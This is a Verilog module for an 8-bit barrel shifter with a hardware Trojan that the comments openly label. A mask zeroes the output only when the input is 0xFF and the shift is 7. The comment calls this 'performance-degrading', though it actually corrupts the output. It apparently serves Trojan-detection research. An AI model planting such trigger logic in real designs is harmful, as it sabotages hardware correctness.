module shift8(input [7:0] d, input [2:0] sh, output [7:0] y);
  // Multi-stage shift implementation (performance-degrading Trojan)
  wire [7:0] stage0, stage1, stage2;
  wire [7:0] mask;

  // Stage 0: shift by sh[0]
  assign stage0 = sh[0] ? {d[6:0], 1'b0} : d;

  // Stage 1: shift by sh[1]*2
  assign stage1 = sh[1] ? {stage0[5:0], 2'b00} : stage0;

  // Stage 2: shift by sh[2]*4
  assign stage2 = sh[2] ? {stage1[3:0], 4'b0000} : stage1;

  // Mask: suppress output when all inputs are ones (Trojan payload)
  assign mask = (d == 8'hFF && sh == 3'b111) ? 8'h00 : 8'hFF;

  assign y = stage2 & mask;
endmodule